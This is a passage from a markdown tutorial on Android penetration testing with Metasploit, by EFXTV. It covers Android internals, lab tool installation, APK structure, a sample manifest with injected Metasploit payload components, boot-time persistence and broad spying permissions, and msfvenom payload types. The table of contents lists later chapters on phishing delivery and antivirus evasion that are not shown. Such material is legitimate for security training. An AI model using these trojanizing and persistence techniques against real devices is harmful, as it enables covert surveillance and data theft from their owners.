# Metasploit Framework: Android Penetration Testing Masterclass by [EFXTV](https://t.me/efxtv)
## The Complete Professional Guide — From Zero to Advanced

---

> **By EFXTv** | Professional Security Research Edition
> 
> *"Every expert was once a beginner. Every pro was once an amateur."*

---

> ⚠️ **CRITICAL LEGAL NOTICE**: This guide is **strictly** for:
> - Authorized penetration testing with written permission
> - Security research on devices you own
> - Educational purposes in controlled lab environments
> - Certified security professionals during engagements
>
> **Unauthorized access to any device is ILLEGAL.** Violations can result in criminal prosecution under the Computer Fraud and Abuse Act (CFAA), the Information Technology Act (India), and equivalent laws globally. The author assumes ZERO responsibility for misuse.

---

## Table of Contents

```
PART 1: FOUNDATIONS
├── Chapter 1: Understanding Android Architecture
├── Chapter 2: Setting Up Your Lab Environment
├── Chapter 3: Understanding APK Structure
└── Chapter 4: Metasploit Fundamentals for Android

PART 2: BUILDING ANDROID PAYLOADS
├── Chapter 5: Understanding Android Payloads
├── Chapter 6: Building Standalone Payload APKs
├── Chapter 7: Customizing Payload APKs
└── Chapter 8: Advanced Payload Generation

PART 3: BINDING PAYLOADS WITH LEGITIMATE APPS
├── Chapter 9: What is APK Binding?
├── Chapter 10: Manual APK Binding (Step-by-Step)
├── Chapter 11: Automated APK Binding
├── Chapter 12: Advanced Binding Techniques
└── Chapter 13: Post-Build: Signing and Alignment

PART 4: DELIVERING THE PAYLOAD
├── Chapter 14: Delivery Methods Overview
├── Chapter 15: Direct Installation Methods
├── Chapter 16: Remote Delivery Methods
├── Chapter 17: Social Engineering Delivery
└── Chapter 18: Network-Based Delivery

PART 5: SETTING UP LISTENERS
├── Chapter 19: Understanding Listeners (Handlers)
├── Chapter 20: Basic Listener Setup
├── Chapter 21: Advanced Listener Configuration
├── Chapter 22: Multi-Protocol Listeners
└── Chapter 23: Listener Automation with Resource Scripts

PART 6: POST-EXPLOITATION ON ANDROID
├── Chapter 24: Meterpreter Commands for Android
├── Chapter 25: Data Extraction
├── Chapter 26: Surveillance Capabilities
├── Chapter 27: Network Operations
├── Chapter 28: File System Operations
└── Chapter 29: Maintaining Access

PART 7: EVASION AND ADVANCED TECHNIQUES
├── Chapter 30: Bypassing Google Play Protect
├── Chapter 31: Bypassing Antivirus on Android
├── Chapter 32: Obfuscation Techniques
├── Chapter 33: Encrypted Payloads
└── Chapter 34: Using Frida with Metasploit

PART 8: REAL-WORLD SCENARIOS
├── Chapter 35: Lab Exercise 1: Basic APK Attack
├── Chapter 36: Lab Exercise 2: Bound APK Attack
├── Chapter 37: Lab Exercise 3: Network-Based Attack
├── Chapter 38: Lab Exercise 4: Phishing Campaign
└── Chapter 39: Professional Reporting

PART 9: REFERENCE
├── Chapter 40: Complete Command Reference
├── Chapter 41: Troubleshooting Guide
├── Chapter 42: Cheat Sheets
└── Chapter 43: Resources and Next Steps
```

---

# PART 1: FOUNDATIONS

---

## Chapter 1: Understanding Android Architecture

Before we can attack Android devices, we must deeply understand how Android works. This chapter covers everything you need to know about the Android operating system from a security perspective.

### 1.1 Android Operating System Layers

```
┌─────────────────────────────────────────────────────────────┐
│                    ANDROID OS ARCHITECTURE                    │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌─────────────────────────────────────────────────────┐    │
│  │                APPLICATIONS LAYER                     │    │
│  │                                                       │    │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌────────┐ │    │
│  │  │  Phone   │ │ Messages │ │  Chrome  │ │ Your   │ │    │
│  │  │   App    │ │   App    │ │ Browser  │ │  App   │ │    │
│  │  └──────────┘ └──────────┘ └──────────┘ └────────┘ │    │
│  └─────────────────────────────────────────────────────┘    │
│                           ↓                                  │
│  ┌─────────────────────────────────────────────────────┐    │
│  │              APPLICATION FRAMEWORK                     │    │
│  │                                                       │    │
│  │  Activity Manager │ Package Manager │ Window Manager  │    │
│  │  Content Providers│ View System     │ Notification Mgr│   │
│  │  Resource Manager │ Telephony Mgr   │ Location Manager│   │
│  └─────────────────────────────────────────────────────┘    │
│                           ↓                                  │
│  ┌─────────────────────────────────────────────────────┐    │
│  │               ANDROID RUNTIME (ART)                   │    │
│  │                                                       │    │
│  │  ┌─────────────────┐  ┌────────────────────────────┐ │    │
│  │  │   Core Libraries │  │  Dalvik Virtual Machine    │ │    │
│  │  │   (Java API)     │  │  (Executes DEX bytecode)   │ │    │
│  │  └─────────────────┘  └────────────────────────────┘ │    │
│  └─────────────────────────────────────────────────────┘    │
│                           ↓                                  │
│  ┌─────────────────────────────────────────────────────┐    │
│  │            NATIVE LIBRARIES (C/C++)                   │    │
│  │                                                       │    │
│  │  libc │ OpenGL │ Media │ SQLite │ WebKit │ SSL       │    │
│  └─────────────────────────────────────────────────────┘    │
│                           ↓                                  │
│  ┌─────────────────────────────────────────────────────┐    │
│  │              HARDWARE ABSTRACTION LAYER               │    │
│  │                                                       │    │
│  │  Audio │ Camera │ Bluetooth │ GPS │ WiFi │ Sensors    │    │
│  └─────────────────────────────────────────────────────┘    │
│                           ↓                                  │
│  ┌─────────────────────────────────────────────────────┐    │
│  │                   LINUX KERNEL                        │    │
│  │                                                       │    │
│  │  Process Management │ Memory │ Drivers │ Networking   │    │
│  │  Security (SELinux) │ IPC    │ Power   │ File Systems │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 Android Application Components

Every Android application is built from four fundamental components. Understanding these is critical because our payloads interact with them:

```
ANDROID APPLICATION COMPONENTS:
│
├── 1. ACTIVITIES
│   ├── What: User interface screens
│   ├── Example: Login screen, main menu, settings
│   ├── Security Relevance:
│   │   ├── Exported activities can be launched by other apps
│   │   ├── Deep links can trigger activities
│   │   └── Our payload often uses an Activity to initialize
│   └── Manifest Entry:
│       <activity android:name=".MainActivity" android:exported="true">
│
├── 2. SERVICES
│   ├── What: Background operations (no UI)
│   ├── Example: Music playback, file download, sync
│   ├── Security Relevance:
│   │   ├── Services run in background even when app is closed
│   │   ├── Our Meterpreter payload runs as a Service
│   │   └── Survives Activity destruction
│   └── Manifest Entry:
│       <service android:name=".PayloadService" android:exported="false">
│
├── 3. BROADCAST RECEIVERS
│   ├── What: Respond to system-wide events
│   ├── Example: Boot completed, SMS received, battery low
│   ├── Security Relevance:
│   │   ├── BOOT_COMPLETED receiver starts payload on device boot
│   │   ├── Can trigger from system events
│   │   └── Enables persistence
│   └── Manifest Entry:
│       <receiver android:name=".BootReceiver">
│           <intent-filter>
│               <action android:name="android.intent.action.BOOT_COMPLETED"/>
│           </intent-filter>
│       </receiver>
│
└── 4. CONTENT PROVIDERS
    ├── What: Manage shared app data
    ├── Example: Contacts, SMS, media files
    ├── Security Relevance:
    │   ├── Can expose sensitive data to other apps
    │   ├── SQL injection possible in some implementations
    │   └── Our payload can query Content Providers for data
    └── Manifest Entry:
        <provider android:name=".MyProvider" 
                  android:authorities="com.example.provider"
                  android:exported="true">
```

### 1.3 Android Security Model

```
ANDROID SECURITY MODEL:
│
├── APPLICATION SANDBOX
│   ├── Each app runs in its own process
│   ├── Each app has its own Linux user ID (UID)
│   ├── Apps cannot access each other's data (by default)
│   ├── /data/data/<package>/ is private to each app
│   └── Our payload inherits the permissions of the host app!
│
├── PERMISSION SYSTEM
│   ├── Install-time permissions (normal)
│   ├── Runtime permissions (dangerous) - Android 6.0+
│   │   ├── CAMERA
│   │   ├── READ_CONTACTS
│   │   ├── ACCESS_FINE_LOCATION
│   │   ├── RECORD_AUDIO
│   │   └── READ_SMS
│   └── Special permissions (require Settings)
│       ├── SYSTEM_ALERT_WINDOW
│       └── WRITE_SETTINGS
│
├── APPLICATION SIGNING
│   ├── All APKs must be signed
│   ├── Signature verifies app integrity
│   ├── Same signature = same developer (updates)
│   ├── Repackaged apps have different signatures
│   └── Users may notice signature mismatch warnings
│
├── GOOGLE PLAY PROTECT
│   ├── Scans apps for malware
│   ├── Checks sideloaded apps
│   ├── Uses machine learning
│   └── May block our payload!
│
└── NETWORK SECURITY
    ├── HTTPS enforced (Android 9+)
    ├── Network Security Config
    ├── Certificate pinning
    └── Cleartext traffic blocked by default
```

### 1.4 How Android Executes Applications

Understanding the execution flow helps us understand where our payload fits:

```
ANDROID APP EXECUTION FLOW:
│
│  1. User taps app icon
│         ↓
│  2. Launcher (home screen) sends Intent to Activity Manager
│         ↓
│  3. Activity Manager checks:
│     ├── Is app process running?
│     ├── Does app have required permissions?
│     └── Is app signature valid?
│         ↓
│  4. If process not running:
│     ├── Zygote (parent process) forks new process
│     ├── ART runtime initialized
│     ├── Application class instantiated
│     └── DEX code loaded into memory
│         ↓
│  5. Application.onCreate() called
│         ↓
│  6. Activity.onCreate() called
│         ↓
│  7. UI displayed to user
│
│  ═══════════════════════════════════════════════════
│  OUR PAYLOAD INTERVENTION POINTS:
│  ═══════════════════════════════════════════════════
│
│  A. In Application.onCreate()
│     └── Payload starts before any Activity
│         └── EARLIEST point, runs even if user doesn't open app
│
│  B. In MainActivity.onCreate()
│     └── Payload starts when user opens app
│         └── MOST COMMON injection point
│
│  C. Via BootReceiver
│     └── Payload starts on device boot
│         └── PERSISTENCE mechanism
│
│  D. Via a new Service
│     └── Payload runs in background
│         └── STEALTHY, no visible UI
│
└── E. Via Content Provider trigger
    └── Payload starts when data is accessed
        └── CONDITIONAL trigger
```

---

## Chapter 2: Setting Up Your Lab Environment

### 2.1 Lab Network Architecture

Before testing anything, we need a proper isolated lab. Here's the recommended setup:

```
PENETRATION TESTING LAB ARCHITECTURE:
│
│  ┌──────────────────────────────────────────────────────────┐
│  │                    YOUR PHYSICAL MACHINE                   │
│  │                                                           │
│  │  ┌─────────────────────────────────────────────────────┐ │
│  │  │              VIRTUALIZATION SOFTWARE                  │ │
│  │  │              (VMware / VirtualBox)                    │ │
│  │  │                                                      │ │
│  │  │  ┌──────────────┐    ┌──────────────────────────┐   │ │
│  │  │  │  KALI LINUX  │    │  TARGET DEVICES           │   │ │
│  │  │  │  (Attacker)  │    │                            │   │ │
│  │  │  │              │    │  ┌──────────────────────┐ │   │ │
│  │  │  │  Tools:      │    │  │  Android Emulator    │ │   │ │
│  │  │  │  - Metasploit│    │  │  (AVD Manager)       │ │   │ │
│  │  │  │  - Apktool   │    │  │  Android 9-14        │ │   │ │
│  │  │  │  - JADX      │    │  └──────────────────────┘ │   │ │
│  │  │  │  - Frida     │    │                            │   │ │
│  │  │  │  - ADB       │    │  ┌──────────────────────┐ │   │ │
│  │  │  │              │    │  │  Physical Android     │ │   │ │
│  │  │  │  IP:         │    │  │  Device (optional)    │ │   │ │
│  │  │  │  192.168.1.10│    │  │  USB connected        │ │   │ │
│  │  │  └──────────────┘    │  └──────────────────────┘ │   │ │
│  │  │         │            │                            │   │ │
│  │  │         │            │  ┌──────────────────────┐ │   │ │
│  │  │         └────────────┼──│  NAT Network         │ │   │ │
│  │  │                      │  │  192.168.1.0/24      │ │   │ │
│  │  │                      │  └──────────────────────┘ │   │ │
│  │  │                      └──────────────────────────┘   │ │
│  │  └─────────────────────────────────────────────────────┘ │
│  └──────────────────────────────────────────────────────────┘
│
│  IMPORTANT: Use an ISOLATED network. Never test on production
│  networks or devices without written authorization!
```

### 2.2 Installing Required Tools

Let's install every tool we'll need, step by step:

#### Step 1: Update Kali Linux

```bash
# Update package lists
sudo apt update

# Upgrade all packages
sudo apt upgrade -y

# Install essential build tools
sudo apt install -y build-essential git curl wget unzip

# Verify you have root/sudo access
whoami
sudo whoami
```

#### Step 2: Verify and Update Metasploit

```bash
# Check current Metasploit version
msfconsole --version
# Expected output: Framework Version: 6.x.x

# Update Metasploit to latest version
sudo apt install -y metasploit-framework

# OR use the built-in updater
sudo msfupdate

# Initialize the database (if not already done)
sudo msfdb init

# Start the database service
sudo systemctl start postgresql
sudo systemctl enable postgresql

# Verify database connection
msfconsole -q -x "db_status; exit"
# Expected output: [*] postgresql connected to msf_database

# If database isn't working, reinitialize:
sudo msfdb reinit
sudo msfdb start
```

#### Step 3: Install Java Development Kit

```bash
# Java is required for Apktool, keytool, jarsigner, and Android tools
sudo apt install -y default-jdk

# Verify Java installation
java -version
# Expected output: openjdk version "11.x.x" or "17.x.x"

javac -version
# Expected output: javac 11.x.x or 17.x.x

# Set JAVA_HOME environment variable
echo 'export JAVA_HOME=/usr/lib/jvm/default-java' >> ~/.bashrc
source ~/.bashrc

# Verify keytool is available (used for APK signing)
keytool -h 2>&1 | head -5

# Verify jarsigner is available (used for APK signing)
jarsigner -h 2>&1 | head -5
```

#### Step 4: Install Apktool

```bash
# Apktool is used to decompile and recompile APK files
# It converts APK → readable resources + Smali code
# And back: Smali code + resources → APK

# Method 1: Install via apt (recommended for Kali)
sudo apt install -y apktool

# Method 2: Manual installation (if apt version is outdated)
# Download latest Apktool
wget https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar

# Move to system directory
sudo mkdir -p /usr/local/bin
sudo mv apktool_2.9.3.jar /usr/local/bin/apktool.jar

# Create a wrapper script so we can just type "apktool"
cat << 'EOF' | sudo tee /usr/local/bin/apktool
#!/bin/bash
# Apktool wrapper script
# This allows us to run "apktool" instead of "java -jar /path/to/apktool.jar"
exec java -jar /usr/local/bin/apktool.jar "$@"
EOF

# Make the wrapper script executable
sudo chmod +x /usr/local/bin/apktool

# Verify installation
apktool --version
# Expected output: 2.9.3 (or similar version number)
```

**What does Apktool do?**

```
APKTOOL WORKFLOW:
│
│  Original APK (compiled binary)
│         │
│         │ apktool d app.apk -o decompiled/
│         ↓
│  ┌─────────────────────────────┐
│  │      DECOMPILED OUTPUT       │
│  │                              │
│  │  AndroidManifest.xml ← Readable XML (was binary XML)
│  │  res/                  ← Resources (layouts, strings, images)
│  │  smali/                ← Disassembled code (Dalvik assembly)
│  │  smali_classes2/       ← Multi-dex secondary classes
│  │  assets/               ← Raw asset files
│  │  lib/                  ← Native libraries (.so files)
│  │  original/             ← Original META-INF and manifest
│  │  apktool.yml           ← Apktool metadata
│  └─────────────────────────────┘
│         │
│         │ We MODIFY files here (inject payload, change manifest)
│         ↓
│  ┌─────────────────────────────┐
│  │      MODIFIED DECOMPILED     │
│  │                              │
│  │  + Our payload Smali code    │
│  │  + Modified manifest         │
│  │  + Additional permissions    │
│  │  + Original app code         │
│  └─────────────────────────────┘
│         │
│         │ apktool b decompiled/ -o rebuilt.apk
│         ↓
│  Rebuilt APK (unsigned, needs signing)
```

#### Step 5: Install JADX

```bash
# JADX decompiles APK/DEX into readable Java source code
# Unlike Apktool (which gives Smali), JADX gives actual Java

# Install via apt
sudo apt install -y jadx

# OR manual installation
wget https://github.com/skylot/jadx/releases/download/v1.5.0/jadx-1.5.0.zip
sudo unzip jadx-1.5.0.zip -d /opt/jadx
sudo ln -sf /opt/jadx/bin/jadx /usr/local/bin/jadx
sudo ln -sf /opt/jadx/bin/jadx-gui /usr/local/bin/jadx-gui

# Verify
jadx --version
# Expected output: 1.5.0 (or similar)

# Usage examples (we'll use these later):
# Decompile APK to Java source:
#   jadx -d output_dir/ app.apk
#
# Open in GUI:
#   jadx-gui app.apk
```

#### Step 6: Install Android SDK Tools (ADB)

```bash
# ADB (Android Debug Bridge) lets us communicate with Android devices

# Install Android tools
sudo apt install -y android-sdk adb android-tools-adb android-tools-fastboot

# OR install just ADB
sudo apt install -y adb

# Verify ADB installation
adb version
# Expected output: Android Debug Bridge version x.x.xx

# Test ADB with a connected device (if you have one)
adb devices
# This will list connected Android devices/emulators

# Common ADB commands we'll use:
# adb devices                          - List connected devices
# adb install app.apk                  - Install APK on device
# adb install -r app.apk               - Replace existing app
# adb uninstall com.package.name       - Uninstall app
# adb shell                            - Open device shell
# adb push local.file /sdcard/         - Copy file to device
# adb pull /sdcard/file local.file     - Copy file from device
# adb logcat                           - View device logs
```

#### Step 7: Install Android Emulator (Optional but Recommended)

```bash
# Having an Android emulator lets us test payloads safely

# Option A: Using Android Studio's AVD Manager
# 1. Download Android Studio from https://developer.android.com/studio
# 2. Install it
# 3. Open Tools → AVD Manager
# 4. Create Virtual Device → Select Pixel 4 → Download System Image (API 29)
# 5. Finish and Launch

# Option B: Using command-line SDK Manager
# Install SDK Manager
sudo apt install -y android-sdk

# Create an AVD (Android Virtual Device)
# sdkmanager "system-images;android-29;google_apis;x86_64"
# avdmanager create avd -n TestDevice -k "system-images;android-29;google_apis;x86_64"
# emulator -avd TestDevice

# Option C: Using Genymotion (lighter, faster)
# Download from https://www.genymotion.com/
# Free for personal use

# Verify emulator is running
adb devices
# Should show: emulator-5554   device
```

#### Step 8: Install zipalign

```bash
# zipalign optimizes APK files for better performance
# It's required before signing

# Install as part of Android SDK build tools
sudo apt install -y zipalign

# OR if not available via apt:
# It comes with Android SDK Build Tools
# Download from Android SDK or:
# Find it at: $ANDROID_HOME/build-tools/<version>/zipalign

# Verify
which zipalign
zipalign --help 2>&1 | head -3
```

#### Step 9: Install Additional Python Tools

```bash
# Some useful Python tools for Android security testing

# Androguard - Android analysis library
pip3 install androguard

# APKInspector
pip3 install apkinspector

# objection - Runtime mobile exploration (uses Frida)
pip3 install objection

# Verify
python3 -c "from androguard.core.apk import APK; print('Androguard OK')"
objection version
```

#### Step 10: Set Up Working Directory Structure

```bash
# Create a clean working directory for our Android pentest projects
mkdir -p ~/android-pentest
cd ~/android-pentest

# Create subdirectories for organization
mkdir -p payloads          # Generated payload APKs
mkdir -p original_apps     # Original legitimate APKs
mkdir -p decompiled        # Decompiled APK outputs
mkdir -p bound_apps        # Final bound (payload + legitimate) APKs
mkdir -p signing_keys      # APK signing keystores
mkdir -p listeners         # Listener configurations
mkdir -p scripts           # Resource scripts and automation
mkdir -p loot              # Collected data from sessions
mkdir -p reports           # Penetration test reports
mkdir -p wordlists         # Wordlists for brute force

echo "Working directory structure created!"
tree -L 1 ~/android-pentest/
# Output:
# android-pentest/
# ├── bound_apps/
# ├── decompiled/
# ├── listeners/
# ├── loot/
# ├── original_apps/
# ├── payloads/
# ├── reports/
# ├── scripts/
# └── signing_keys/
```

### 2.3 Verifying Your Setup

```bash
# Run this comprehensive check to verify everything is installed
echo "=== Environment Verification ==="

echo -n "Metasploit: " && msfconsole --version 2>/dev/null | head -1
echo -n "Apktool: " && apktool --version 2>/dev/null
echo -n "JADX: " && jadx --version 2>/dev/null
echo -n "ADB: " && adb version 2>/dev/null | head -1
echo -n "Java: " && java -version 2>&1 | head -1
echo -n "keytool: " && keytool 2>&1 | head -1
echo -n "jarsigner: " && jarsigner 2>&1 | head -1
echo -n "zipalign: " && zipalign --help 2>&1 | head -1
echo -n "Python3: " && python3 --version 2>/dev/null
echo -n "PostgreSQL: " && sudo systemctl is-active postgresql 2>/dev/null

echo ""
echo "=== Database Status ==="
msfconsole -q -x "db_status; exit" 2>/dev/null

echo ""
echo "=== All tools should show version numbers above ==="
echo "=== If any tool is missing, install it before proceeding ==="
```

---

## Chapter 3: Understanding APK Structure

### 3.1 What is an APK?

An APK (Android Package Kit) is the file format used to distribute and install applications on Android. It's essentially a ZIP archive with a specific structure:

```
COMPLETE APK STRUCTURE:
│
│  my_app.apk (actually a ZIP file)
│  │
│  ├── AndroidManifest.xml
│  │   ├── Binary XML format (compiled)
│  │   ├── App permissions (INTERNET, CAMERA, etc.)
│  │   ├── Component declarations (Activities, Services, etc.)
│  │   ├── Minimum/Target SDK version
│  │   ├── Package name (com.example.myapp)
│  │   ├── Version code and name
│  │   └── Security settings (debuggable, allowBackup)
│  │
│  ├── classes.dex
│  │   ├── Dalvik Executable (compiled bytecode)
│  │   ├── All Java/Kotlin code compiled to DEX format
│  │   ├── This is where our payload code will live
│  │   └── Can be multiple files (classes2.dex, classes3.dex...)
│  │
│  ├── classes2.dex (optional, for multi-dex apps)
│  │   └── Additional code when classes.dex exceeds 64K methods
│  │
│  ├── resources.arsc
│  │   └── Compiled binary resource table (IDs for resources)
│  │
│  ├── res/
│  │   ├── layout/
│  │   │   ├── activity_main.xml      (UI layout)
│  │   │   └── activity_login.xml     (UI layout)
│  │   ├── drawable/
│  │   │   ├── icon.png               (App icon)
│  │   │   └── logo.png               (App logo)
│  │   ├── values/
│  │   │   ├── strings.xml            (Text strings)
│  │   │   ├── colors.xml             (Color definitions)
│  │   │   └── styles.xml             (Theme styles)
│  │   ├── xml/
│  │   │   └── network_security_config.xml
│  │   └── mipmap-*/
│  │       └── ic_launcher.png        (App launcher icon)
│  │
│  ├── lib/
│  │   ├── armeabi-v7a/
│  │   │   └── libnative.so           (32-bit ARM native library)
│  │   ├── arm64-v8a/
│  │   │   └── libnative.so           (64-bit ARM native library)
│  │   ├── x86/
│  │   │   └── libnative.so           (32-bit Intel native library)
│  │   └── x86_64/
│  │       └── libnative.so           (64-bit Intel native library)
│  │
│  ├── assets/
│  │   ├── fonts/
│  │   ├── images/
│  │   ├── databases/
│  │   └── web/
│  │       └── index.html             (WebView content)
│  │
│  ├── META-INF/
│  │   ├── MANIFEST.MF                (Manifest of all files)
│  │   ├── CERT.SF                    (Signature file)
│  │   ├── CERT.RSA                   (Digital certificate)
│  │   └── CERT.EC                    (EC certificate, newer)
│  │
│  └── kotlin/ (optional)
│       └── kotlin_builtins            (Kotlin metadata)
│
└── END OF APK STRUCTURE
```

### 3.2 The DEX File Format (Deep Dive)

Since our payload code lives inside DEX files, let's understand them:

```
DEX FILE FORMAT (classes.dex):
│
│  ┌─────────────────────────────────────┐
│  │           HEADER SECTION            │
│  │                                     │
│  │  Magic Number: "dex\n035\0"        │
│  │  Checksum: Adler32                  │
│  │  SHA-1 Signature                    │
│  │  File Size                          │
│  │  Header Size (0x70)                 │
│  │  Endian Tag (0x12345678)            │
│  │  Link Size/Offset                   │
│  │  Map Offset                         │
│  │  String IDs Size/Offset             │
│  │  Type IDs Size/Offset               │
│  │  Proto IDs Size/Offset              │
│  │  Field IDs Size/Offset              │
│  │  Method IDs Size/Offset             │
│  │  Class Definitions Size/Offset      │
│  │  Data Size/Offset                   │
│  └─────────────────────────────────────┘
│  ┌─────────────────────────────────────┐
│  │          STRING IDS SECTION         │
│  │                                     │
│  │  Array of offsets to string data    │
│  │  Examples:                          │
│  │    "Lcom/example/MyClass;"          │
│  │    "onCreate"                       │
│  │    "Ljava/lang/String;"             │
│  └─────────────────────────────────────┘
│  ┌─────────────────────────────────────┐
│  │           TYPE IDS SECTION          │
│  │                                     │
│  │  Array of type descriptors          │
│  │  References to string IDs           │
│  └─────────────────────────────────────┘
│  ┌─────────────────────────────────────┐
│  │          METHOD IDS SECTION         │
│  │                                     │
│  │  Array of method references         │
│  │  Each: class_idx, proto_idx, name   │
│  └─────────────────────────────────────┘
│  ┌─────────────────────────────────────┐
│  │     CLASS DEFINITIONS SECTION       │
│  │                                     │
│  │  For each class:                    │
│  │    Class index                      │
│  │    Access flags                     │
│  │    Superclass index                 │
│  │    Interfaces                       │
│  │    Source file name                 │
│  │    Annotations                      │
│  │    Class data (fields + methods)    │
│  │    Static values                    │
│  └─────────────────────────────────────┘
│  ┌─────────────────────────────────────┐
│  │           DATA SECTION              │
│  │                                     │
│  │  Code items (method implementations)│
│  │  String data                        │
│  │  Type lists                         │
│  │  Annotations                        │
│  │  Encoded arrays                     │
│  │  Class data                         │
│  └─────────────────────────────────────┘
│
└── When we inject payload, we ADD new class definitions
    and code items to this structure
```

### 3.3 AndroidManifest.xml Security Analysis

The manifest is the most important file from a security perspective:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!--
    AndroidManifest.xml - The "ID Card" of an Android App
    Every APK must have this file.
    It declares what the app can do and what components it has.
-->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    
    <!-- PACKAGE NAME: Unique identifier for the app -->
    package="com.example.legitimateapp"
    
    <!-- VERSION: Used for updates -->
    android:versionCode="10"
    android:versionName="2.5.1">

    <!--
    ╔══════════════════════════════════════════════════════════╗
    ║  PERMISSIONS - What the app can access on the device    ║
    ║                                                         ║
    ║  Our payload needs certain permissions to function.     ║
    ║  We must ADD these to the manifest when binding.        ║
    ╚══════════════════════════════════════════════════════════╝
    -->
    
    <!-- NETWORK: Required for payload to connect back to us -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    
    <!-- PHONE: Required for device info and calls -->
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.CALL_PHONE" />
    
    <!-- SMS: Required for reading/sending SMS -->
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    
    <!-- CONTACTS: Required for reading contacts -->
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    
    <!-- STORAGE: Required for file access -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    
    <!-- CAMERA: Required for taking photos -->
    <uses-permission android:name="android.permission.CAMERA" />
    
    <!-- AUDIO: Required for recording -->
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    
    <!-- LOCATION: Required for GPS tracking -->
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    
    <!-- PERSISTENCE: Required for auto-start on boot -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />

    <!--
    ╔══════════════════════════════════════════════════════════╗
    ║  APPLICATION TAG - Main app configuration               ║
    ╚══════════════════════════════════════════════════════════╝
    -->
    <application
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher"
        android:theme="@style/AppTheme"
        
        <!-- SECURITY FLAGS (we care about these!) -->
        android:debuggable="false"
        android:allowBackup="true">

        <!--
        ╔══════════════════════════════════════════════════════════╗
        ║  ORIGINAL APP'S ACTIVITIES                               ║
        ╚══════════════════════════════════════════════════════════╝
        -->
        <activity android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <activity android:name=".LoginActivity" />
        <activity android:name=".SettingsActivity" />

        <!--
        ╔══════════════════════════════════════════════════════════╗
        ║  OUR INJECTED PAYLOAD COMPONENTS                         ║
        ║                                                         ║
        ║  These lines are ADDED during the binding process.      ║
        ║  They declare our payload's Activity and Service.       ║
        ╚══════════════════════════════════════════════════════════╝
        -->
        
        <!-- Payload Activity: Starts when app launches -->
        <activity android:name="com.metasploit.stage.Payload"
            android:exported="false" />
        
        <!-- Payload Service: Runs in background -->
        <service android:name="com.metasploit.stage.MainService"
            android:exported="false">
            <intent-filter>
                <action android:name="com.metasploit.stage.MainService"/>
            </intent-filter>
        </service>

        <!-- Boot Receiver: Starts payload on device boot -->
        <receiver android:name="com.metasploit.stage.BootReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>

    </application>
</manifest>
```

---

## Chapter 4: Metasploit Fundamentals for Android

### 4.1 Key Metasploit Concepts for Android

```
KEY CONCEPTS FOR ANDROID TESTING:
│
├── PAYLOAD TYPES FOR ANDROID
│   │
│   ├── android/meterpreter/reverse_tcp
│   │   ├── MOST COMMON Android payload
│   │   ├── Creates reverse TCP connection to your machine
│   │   ├── Full Meterpreter functionality
│   │   ├── Staged: stager + stage sent separately
│   │   └── Use when: TCP connections are unrestricted
│   │
│   ├── android/meterpreter/reverse_http
│   │   ├── Communication over HTTP (port 80)
│   │   ├── Better for bypassing firewalls
│   │   ├── Traffic looks like normal web browsing
│   │   └── Use when: Only HTTP traffic is allowed
│   │
│   ├── android/meterpreter/reverse_https
│   │   ├── Communication over HTTPS (port 443)
│   │   ├── ENCRYPTED communication
│   │   ├── Hardest to detect by network monitoring
│   │   ├── Traffic looks like normal HTTPS
│   │   └── Use when: Security monitoring is active
│   │
│   └── android/shell/reverse_tcp
│       ├── Simple command shell (not Meterpreter)
│       ├── Smaller payload size
│       ├── Less functionality
│       └── Use when: Need minimal footprint
│
├── STAGED vs STAGELESS
│   │
│   ├── STAGED (e.g., android/meterpreter/reverse_tcp)
│   │   ├── Two-step delivery
│   │   ├── Step 1: Small "stager" connects to your listener
│   │   ├── Step 2: Listener sends "stage" (full Meterpreter)
│   │   ├── Smaller initial payload
│   │   ├── More reliable
│   │   └── REQUIRES listener to be running
│   │
│   └── STAGELESS (e.g., android/meterpreter_reverse_tcp)
│       ├── Single-step delivery
│       ├── Complete payload in one piece
│       ├── Larger file size
│       ├── Works even if listener isn't ready (can wait)
│       └── Note the UNDERSCORE instead of SLASH in name
│
└── HANDLER (LISTENER)
    ├── The "server" that waits for payload connections
    ├── Must match the payload type exactly
    ├── Must have correct LHOST and LPORT
    ├── Runs on YOUR machine (Kali)
    └── Receives and manages Meterpreter sessions
```

### 4.2 Understanding Msfvenom for Android

Msfvenom is the tool that GENERATES payloads. Let's understand every option:

```bash
# ═══════════════════════════════════════════════════════════════
#                    MSFVENOM OVERVIEW
# ═══════════════════════════════════════════════════════════════
#
# Msfvenom = Msf(payload) + Msf(encode) + Msf(nop)
#
# It combines payload generation + encoding into one tool
#
# BASIC SYNTAX:
#   msfvenom -p <payload> [options] -f <format> -o <output>
#
# ═══════════════════════════════════════════════════════════════

# List all Android payloads
msfvenom -l payloads | grep android

# Output (what's available):
# android/meterpreter/reverse_tcp     - Reverse TCP Meterpreter
# android/meterpreter/reverse_http    - Reverse HTTP Meterpreter
# android/meterpreter/reverse_https   - Reverse HTTPS Meterpreter
# android/meterpreter_reverse_tcp     - Stageless Reverse TCP
# android/shell/reverse_tcp           - Simple reverse shell
